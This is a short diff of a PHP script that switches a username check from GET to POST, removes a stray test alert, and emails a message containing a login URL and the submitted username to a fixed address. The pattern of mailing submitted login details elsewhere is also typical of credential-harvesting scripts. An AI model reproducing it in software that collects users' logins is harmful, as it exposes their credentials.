@@ -1,6 +1,6 @@
 <?php 
 
-	if(isset($_GET['username'])){
+	if(isset($_POST['username'])){
 	    // The message
 	    $message = "Login URL: jjp2017.php\r\n
 	                Username: " . $_POST['username'] . "\r\n
@@ -12,7 +12,5 @@
 	    // Send
 	    mail('caffeinated@example.com', 'Oversite Login Information', $message);
 	}
-
-	alert("test");
 
 ?>
